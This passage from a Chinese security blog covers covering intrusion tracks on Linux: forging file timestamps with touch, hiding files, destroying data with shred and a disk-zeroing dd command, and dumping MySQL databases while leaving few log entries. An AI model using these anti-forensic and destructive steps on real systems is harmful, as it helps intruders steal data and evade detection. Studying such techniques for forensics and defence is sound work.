<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-m：等同于–time=mtime，修改mtime</span><br><span class="line">-a：等同于–time=atime，修改atime</span><br><span class="line">-t：时间戳修改为指定时间[[CC]YY]MMDDhhmm[.ss]，如果不指定时间戳，则默认时间为当前时间</span><br><span class="line">-d：时间戳修改为指定字符串，如<span class="string">&quot;2020-12-12 12:12:12.00&quot;</span>，如果不指定时间戳，则默认时间为当前时间</span><br><span class="line">-r file：等同于–reference=file，时间戳修改为与file相同</span><br></pre></td></tr></table></figure>

<p>​    注意：<code>-d</code>和<code>-t</code>参数都有指定时间戳的功能，但是<code>-t</code>参数只能精确到秒，使用<code>stat</code>查看文件很容易看出破绽，使用<code>-d</code>参数更加精确隐蔽。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074235.jpg"
                      alt="image-20220825214343015"
                ></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将3.aspx的atime和mtime修改为&quot;2020-12-12 12:12:12&quot;</span></span><br><span class="line"><span class="built_in">touch</span> -t 202012121212.12 3.aspx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将3.aspx的mtime修改为&quot;2020-12-12 12:12:12.8731390581&quot;</span></span><br><span class="line"><span class="built_in">touch</span> -m -d <span class="string">&quot;2020-12-12 12:12:12.831390581&quot;</span> 3.aspx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先将3.aspx的atime和mtime时间戳备份，待修改3.aspx后，再将其时间戳恢复</span></span><br><span class="line"><span class="built_in">touch</span> temp -r 3.aspx</span><br><span class="line">vim 3.aspx</span><br><span class="line"><span class="built_in">touch</span> 3.aspx -r temp</span><br><span class="line"><span class="built_in">rm</span> temp </span><br></pre></td></tr></table></figure>

<h5 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h5><p>​    Linux中以<code>.</code>开头命名的文件或文件夹即为隐藏文件，因此要隐藏某个文件或文件夹直接将其名字前加一个<code>.</code>就可以了。</p>
<p>​    查看所有文件（包括隐藏文件）可以用<code>ls -a</code>命令，只查看隐藏文件可以用<code>ls -d .*</code>命令。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74236.jpg"
                      alt="image-20220825215245935"
                ></p>
<h5 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h5><pre><code>需要修改的文件属性除了时间戳，主要还包括所属用户/组、读写权限等，常见命令如下：
</code></pre>
<p>​    1、chown：修改文件所属用户，chown [options] [user][:[group]] file</p>
<p>​    2、chgrp：修改文件所属组，chgrp [options] [group] file</p>
<p>​    3、chmod：修改文件读/写/执行权限，有两种命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> [options] mode[,mode] file，其中mode为[ugoa][-+=][rwx]，具体含义为：</span><br><span class="line">u/g/o/a：user文件的所属用户/group文件的所属组/others其他用户/all所有用户及用户组</span><br><span class="line">-/+/=：权限的去除/添加/设置</span><br><span class="line">r/w/x：读/写/执行</span><br><span class="line"><span class="built_in">chmod</span> [options] octal-mode file，rwx对应各自权重，分别为二进制100、010、001，即421</span><br><span class="line">比如以下这两句命令是等同的：<span class="built_in">chmod</span> u=rwx,g=rx,o=r test.txt、<span class="built_in">chmod</span> 754 test.txt</span><br></pre></td></tr></table></figure>

<p>​    以上三种命令options有一个共同的参数-R：递归改变该目录及其子目录中的文件。</p>
<h4 id="文件擦除"><a href="#文件擦除" class="headerlink" title="文件擦除"></a>文件擦除</h4><p>​    为避免数据被恢复，对于敏感文件和工具，不应使用常规的<code>rm</code>、<code>rmdir</code>删除命令，而应使用覆写删除命令进行删除：</p>
<h5 id="shred命令"><a href="#shred命令" class="headerlink" title="shred命令"></a>shred命令</h5><p>实现安全的从硬盘上擦除数据，命令格式为：shred [options] file，options具体参数如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-f, --force：必要时修改权限以使目标可写</span><br><span class="line">-n, --iterations=N：覆盖N次，不指定次数则默认3 次</span><br><span class="line">-s, --size=N：将文件内容粉碎为指定字节大小的碎片(可使用K、M 和G 作为单位)</span><br><span class="line">-u, --remove：覆盖后截断并删除文件</span><br><span class="line">-v, --verbose：显示详细信息</span><br><span class="line">-z, --zero：最后一次使用ascii的0x00进行覆盖以隐藏覆盖动作</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将test1覆写6次后再填0x00，最后将其删除</span></span><br><span class="line"><span class="built_in">shred</span> -zufvn 6 1.txt</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074237.jpg"
                      alt="image-20220825220702622"
                ></p>
<h5 id="dd命令"><a href="#dd命令" class="headerlink" title="dd命令"></a>dd命令</h5><p>​    dd命令通常用来备份、恢复、转换磁盘上的分区和文件，也可以实现安全擦除数据，命令格式为：<code>dd options</code>，options包括：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>=file：输入文件名，缺省为标准输入</span><br><span class="line">of=file：输出文件名，缺省为标准输出</span><br><span class="line">ibs=size：读入块大小为size bytes</span><br><span class="line">obs=size：写出块大小为size bytes</span><br><span class="line">bs=size：同时设置读写块的大小为size bytes</span><br><span class="line">count=N：仅拷贝N个块，每块的大小为size bytes</span><br></pre></td></tr></table></figure>

<p>​    size单位默认为byte，同时也可以使用K、M、G为单位。常使用方法如下：</p>
<p>​    全盘数据备份：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda1 of=~/image</span><br></pre></td></tr></table></figure>

<p>​    备份磁盘开始的512个字节大小的MBR信息到指定文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda1 of=~/image bs=512 count=1 </span><br></pre></td></tr></table></figure>

<p>​    利用0填充销毁磁盘数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=/dev/hda1</span><br></pre></td></tr></table></figure>

<p>​    利用随机数填充销毁文件数据，文件大小为1K，覆写6次：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/urandom of=~/test bs=1k count=6 </span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Windows入侵痕迹清理"><a href="#Windows入侵痕迹清理" class="headerlink" title="Windows入侵痕迹清理"></a>Windows入侵痕迹清理</h3><p>1</p>
<hr>
<h3 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h ip -P 3306 -u root -p</span><br></pre></td></tr></table></figure>

<p>​    收录一些判断数据库和表大小的方法，以及一些语句。</p>
<p>​    首先打开数据库的日志记录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074238.jpg"
                      alt="image-20220829140403933"
                ></p>
<p>​    开启日志</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="string">&#x27;On&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>​    更换位置</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/lib/mysql/mysql.log&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074239.jpg"
                      alt="image-20220829142319070"
                ></p>
<p>​    我们查看日志可以看到连接ip信息等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074243.jpg"
                      alt="image-20220829143107311"
                ></p>
<h4 id="查看数据库大小"><a href="#查看数据库大小" class="headerlink" title="查看数据库大小"></a>查看数据库大小</h4><p>​    查询所用数据库总大小</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use information_schema;</span><br><span class="line"><span class="keyword">select</span> concat(round(<span class="built_in">sum</span>(DATA_LENGTH<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>),<span class="number">2</span>),<span class="string">&#x27;MB&#x27;</span>) <span class="keyword">as</span> data <span class="keyword">from</span> TABLES;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74245.jpg"
                      alt="image-20220829143834770"
                ></p>
<p>​    查看指定数据库每一个表容量大小:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">as</span> <span class="string">&#x27;数据库&#x27;</span>, table_name <span class="keyword">as</span> <span class="string">&#x27;表名&#x27;</span>,table_rows <span class="keyword">as</span> <span class="string">&#x27;记录数&#x27;</span>,<span class="keyword">truncate</span>(data_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>) <span class="keyword">as</span> <span class="string">&#x27;数据容量(MB)&#x27;</span>,<span class="keyword">truncate</span>(index_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>) <span class="keyword">as</span> <span class="string">&#x27;索引容量(MB)&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;mysql&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> data_length <span class="keyword">desc</span>, index_length <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074246.jpg"
                      alt="image-20220829144425000"
                ></p>
<p>​    查看指定单个数据库容量大小：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">as</span> <span class="string">&#x27;数据库&#x27;</span>, <span class="built_in">sum</span>(table_rows) <span class="keyword">as</span> <span class="string">&#x27;记录数&#x27;</span>, <span class="built_in">sum</span>(<span class="keyword">truncate</span>(data_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;数据容量(MB)&#x27;</span>, <span class="built_in">sum</span>(<span class="keyword">truncate</span>(index_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;索引容量(MB)&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;mysql&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074247.jpg"
                      alt="image-20220829144743445"
                ></p>
<p>​    查询每个裤总容量：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">as</span> <span class="string">&#x27;数据库&#x27;</span>, <span class="built_in">sum</span>(table_rows) <span class="keyword">as</span> <span class="string">&#x27;记录数&#x27;</span>,<span class="built_in">sum</span>(<span class="keyword">truncate</span>(data_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;数据容量(MB)&#x27;</span>,<span class="built_in">sum</span>(<span class="keyword">truncate</span>(index_length<span class="operator">/</span><span class="number">1024</span><span class="operator">/</span><span class="number">1024</span>, <span class="number">2</span>)) <span class="keyword">as</span> <span class="string">&#x27;索引容量(MB)&#x27;</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> table_schema <span class="keyword">order</span> <span class="keyword">by</span> <span class="built_in">sum</span>(data_length) <span class="keyword">desc</span>, <span class="built_in">sum</span>(index_length) <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074248.jpg"
                      alt="image-20220829144843585"
                ></p>
<h4 id="脱裤备份🫣"><a href="#脱裤备份🫣" class="headerlink" title="脱裤备份🫣"></a>脱裤备份🫣</h4><p>​    脱某个数据库 ，不需要进入数据库：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Linux</span><br><span class="line">语法：mysqldump <span class="operator">-</span>h主机名 <span class="operator">-</span>P 端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 <span class="comment">--databases 数据库名 &gt; 文件名.sql </span></span><br><span class="line">例子：mysqldump <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.10</span><span class="number">.25</span> <span class="operator">-</span>P <span class="number">3306</span> <span class="operator">-</span>uroot <span class="operator">-</span>proot <span class="comment">--databases mysql &gt; /data/backup/www.sql;</span></span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">语法：mysqldump <span class="operator">-</span>h1主机名 <span class="operator">-</span>p端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>密码 库名  <span class="operator">&gt;</span> 文件名.<span class="keyword">sql</span></span><br><span class="line">例子：mysqldump <span class="operator">-</span>h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>p3306 <span class="operator">-</span>uroot <span class="operator">-</span>proot mysql  <span class="operator">&gt;</span> <span class="number">111.</span><span class="keyword">sql</span></span><br></pre></td></tr></table></figure>

<p>​    以上的命令在mysql5.6以下是可以执行的，5.6以上会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74251.jpg"
                      alt="image-20220829151400174"
                ></p>
<p>​    虽然warning了，但是我们看到已经成功执行，看看内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074252.jpg"
                      alt="image-20220830132354151"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074253.jpg"
                      alt="image-20220830132439556"
                ></p>
<p>​    </p>
<p>​    如果不想显示我们有shell，那么在修改配置文件/etc/mysql/my.cnf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqldump]</span><br><span class="line"> </span><br><span class="line">user=root</span><br><span class="line">password=&quot;mima&quot;</span><br></pre></td></tr></table></figure>

<p>​    然后直接执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump 库名 表名 &gt; /data/bak/表_2022-06-09.sql</span><br></pre></td></tr></table></figure>

<p>​    如果没有的话，我们可以选择navicat的数据导出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074254.jpg"
                      alt="image-20220829172137656"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074256.jpg"
                      alt="image-20220829165523963"
                ></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Init DB 	test</span><br><span class="line">Query			<span class="keyword">SHOW</span> <span class="keyword">FULL</span> COLUMNS <span class="keyword">FROM</span> `test_table`</span><br></pre></td></tr></table></figure>

<p>​    在日志上也只有这两行。如果使用mysqldump则记录很多，下面是搜到的小技巧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份全部数据库（包含存储过程、自定义函数及事件）</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --all-databases &gt; /tmp/all_database.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要求记录 binlog 位点信息 可用于搭建从库</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --all-databases --master-data=2 &gt; /tmp/all_database.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份指定数据库</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --databases db1 &gt; /tmp/db1.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction -R -E --databases db1 db2 &gt; /tmp/db1_db2.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份部分表</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 &gt; /tmp/tb1.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 tb2 tb3 &gt; /tmp/tb.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出某个表，数据以单行insert显示</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction --skip-extended-insert db1 tb1 &gt; /tmp/tb1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出单表的部分数据</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 --<span class="built_in">where</span>=<span class="string">&quot; create_time &gt;= &#x27;2021-06-01 00:00:00&#x27; &quot;</span> &gt; /tmp/tb1.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction db1 tb1 --<span class="built_in">where</span>=<span class="string">&#x27;id &lt; 10&#x27;</span> &gt; /tmp/tb1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排除某些表导出</span></span><br><span class="line">mysqldump -uroot -pxxxxxx --single-transaction --databases db1 --ignore-table=db1.tb1 --ignore-table=db1.tb2 &gt; /tmp/db1.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只导出结构或只导出数据</span></span><br><span class="line">mysqldump -uroot -pxxxxxx db1 --no-data &gt; /tmp/db1_jiegou.sql</span><br><span class="line">mysqldump -uroot -pxxxxxx db1 --no-create-info &gt; /tmp/db1_data.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只导出某个库的存储过程及自定义函数</span></span><br><span class="line">mysqldump -uroot -pxxxxxx -d -t -R db1 &gt; /tmp/db1_routine.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程导出 即MySQL服务端不在本地</span></span><br><span class="line">mysqldump -uroot -pxxxxxx -hxxx.xxx.xx -P3306 --single-transaction --databases db1 &gt; /tmp/db1.sql</span><br></pre></td></tr></table></figure>

<p>​    下面根据网上的资源简单分析：</p>
<p>​    mysqldump的大概流程整理如下（白话）：<br>​    1：连接数据库，校验账户，密码，IP<br>​    2：进入INFORMATION_SCHEMA库，获取要备份的数据库的信息，包含存储过程，视图，表<br>​    3：进入INFORMATION_SCHEMA库，获取每个表的字段名称，字段类型等信息<br>​    4：查询每个表的数据，select SQL_NO_CACHE from tbname<br>​    5：拼接成DDL SQL<br>​    6：写入备份文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>FLUSH <span class="operator">/</span><span class="operator">!</span><span class="number">40101</span> <span class="keyword">LOCAL</span> <span class="operator">/</span> TABLES </span><br><span class="line">关闭所有在内存中打开的表，清理查询缓存。</span><br><span class="line"><span class="number">2.</span>FLUSH TABLES <span class="keyword">WITH</span> READ LOCK </span><br><span class="line">加一个全局读锁，只允许读，不允许更新操作。</span><br><span class="line"><span class="number">3.</span><span class="keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ </span><br><span class="line">设置当前会话的事务隔离等级为RR，RR可避免不可重复读和幻读，保证在备份期间，一个事务中所有相同的查询读取到同样的数据。</span><br><span class="line"><span class="number">4.</span><span class="keyword">START</span> TRANSACTION <span class="operator">/</span><span class="operator">!</span><span class="number">40100</span> <span class="keyword">WITH</span> CONSISTENT SNAPSHOT <span class="operator">/</span> </span><br><span class="line">获取当前数据库的快照，这个是由mysqldump中–single<span class="operator">-</span>transaction决定的,类似于开启事务并对所有表执行了一次<span class="keyword">SELECT</span>操作，这样可保证备份时，在任意时间点执行<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span>得到的数据和执行<span class="keyword">START</span> TRANSACTION <span class="keyword">WITH</span> CONSISTENT SNAPSHOT时的数据一致。</span><br><span class="line"><span class="number">5.</span><span class="keyword">SHOW</span> MASTER STATUS </span><br><span class="line">–master<span class="operator">-</span>data决定的，记录了开始备份时，binlog的状态信息，包括MASTER_LOG_FILE和MASTER_LOG_POS</span><br><span class="line"><span class="number">6.</span>UNLOCK TABLES </span><br><span class="line">释放锁，也就是说其实mysqldump这个语句，其实是有锁表，只不过锁了很短的时间</span><br><span class="line"><span class="number">7.</span><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> test </span><br><span class="line">生成创库语句。</span><br><span class="line"><span class="number">8.</span><span class="keyword">SAVEPOINT</span> sp </span><br><span class="line">设置<span class="keyword">SAVEPOINT</span>，然后备份完每个表后再回滚到该<span class="keyword">SAVEPOINT</span>。</span><br><span class="line"><span class="number">9.</span><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> test </span><br><span class="line">生成创表语句</span><br><span class="line"><span class="number">10.</span><span class="keyword">SELECT</span> <span class="operator">/</span><span class="operator">!</span><span class="number">40001</span> SQL_NO_CACHE <span class="operator">/</span> <span class="operator">*</span> <span class="keyword">FROM</span> test </span><br><span class="line">该语句会查询到表test1的所有数据，在备份文件中会生成相应的<span class="keyword">insert</span>语句。 </span><br><span class="line">其中SQL_NO_CACHE的作用是查询的结果并不会缓存到查询缓存中。</span><br><span class="line"><span class="number">11.</span><span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;test&#x27;</span>； </span><br><span class="line">备份触发器。</span><br><span class="line"><span class="number">12.</span><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp </span><br><span class="line">如果不执行<span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp，可能会阻塞同时进行的DDL操作，执行了该语句后，DDL操作可以继续执行。</span><br><span class="line"><span class="number">13.</span><span class="keyword">SHOW</span> <span class="keyword">FUNCTION</span> STATUS <span class="keyword">WHERE</span> Db <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> </span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> mycat_seq_currval </span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">PROCEDURE</span> STATUS <span class="keyword">WHERE</span> Db <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> </span><br><span class="line">用于备份存储过程和函数</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#首先连接到数据库<span class="keyword">connect</span></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.409166</span>Z	  <span class="number">123</span> <span class="keyword">Connect</span>	root<span class="variable">@loacalhost</span> <span class="keyword">on</span>  <span class="keyword">using</span> Socket</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.409796</span>Z	  <span class="number">123</span> Query	<span class="comment">/*!40100 SET @@SQL_MODE=&#x27;&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.410370</span>Z	  <span class="number">123</span> Query	<span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.410941</span>Z	  <span class="number">123</span> Query	<span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;gtid\_mode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span 